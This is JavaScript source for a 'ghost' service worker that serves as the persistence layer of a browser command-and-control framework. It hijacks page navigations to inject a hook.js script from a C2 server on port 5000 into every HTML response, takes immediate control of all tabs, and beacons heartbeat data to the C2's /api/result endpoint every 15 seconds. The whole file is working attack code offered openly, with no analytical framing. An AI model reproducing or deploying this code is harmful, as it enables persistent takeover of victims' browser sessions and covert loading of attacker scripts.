/**
 * Ghost Service Worker — Persistence layer.
 *
 * Once registered, this SW:
 * 1. Intercepts all fetch requests on the origin
 * 2. Injects hook.js into HTML responses (re-hooks on every navigation)
 * 3. Maintains a background heartbeat to C2 even between page loads
 * 4. Survives page refreshes, tab close (if other tabs open), navigation
 *
 * Limitations:
 * - Requires HTTPS or localhost
 * - Same-origin only (can't register cross-origin SW)
 * - Killed when ALL tabs on the origin are closed + browser GC
 */

const C2 = self.location.origin.replace(/:(\d+)$/, ":5000");
const HEARTBEAT_INTERVAL = 15000;

// ─── Install: skip waiting, take control immediately ────────────
self.addEventListener("install", (event) => {
  self.skipWaiting();
  console.log("[ghost-sw] installed");
});

self.addEventListener("activate", (event) => {
  event.waitUntil(self.clients.claim());
  console.log("[ghost-sw] activated, claimed all clients");
  startHeartbeat();
});

// ─── Fetch intercept: inject hook.js into HTML responses ────────
self.addEventListener("fetch", (event) => {
  const req = event.request;

  // Only intercept navigation requests (page loads)
  if (req.mode === "navigate") {
    event.respondWith(
      fetch(req).then((response) => {
        // Clone the response so we can read and modify it
        const cloned = response.clone();

        return cloned.text().then((html) => {
          // Check if it's actually HTML
          const contentType = response.headers.get("content-type") || "";
          if (!contentType.includes("text/html")) {
            return response;
          }

          // Inject hook.js before </body>
          const hookScript = `<script src="${C2}/hook.js"><\/script>`;
          let modified = html;

          if (html.includes("</body>")) {
            modified = html.replace("</body>", `${hookScript}</body>`);
          } else {
            modified = html + hookScript;
          }

          return new Response(modified, {
            status: response.status,
            statusText: response.statusText,
            headers: response.headers,
          });
        });
      }).catch(() => fetch(req))  // Fallback to normal if injection fails
    );
  }
  // All other requests pass through untouched
});

// ─── Background heartbeat ───────────────────────────────────────
let heartbeatTimer = null;

function startHeartbeat() {
  if (heartbeatTimer) return;

  heartbeatTimer = setInterval(async () => {
    try {
      await fetch(`${C2}/api/result`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          agent_id: "sw-heartbeat",
          task_type: "heartbeat",
          data: {
            ts: new Date().toISOString(),
            clients: await countClients(),
          },
        }),
      });
    } catch (e) {
      // C2 unreachable — keep trying
    }
  }, HEARTBEAT_INTERVAL);
}

async function countClients() {
  const clients = await self.clients.matchAll({ type: "window" });
  return clients.length;
}

// ─── Message handler (for commands from hook.js) ────────────────
self.addEventListener("message", (event) => {
  const msg = event.data;
  if (msg && msg.type === "ghost-ping") {
    event.ports[0]?.postMessage({ type: "ghost-pong", status: "alive" });
  }
});
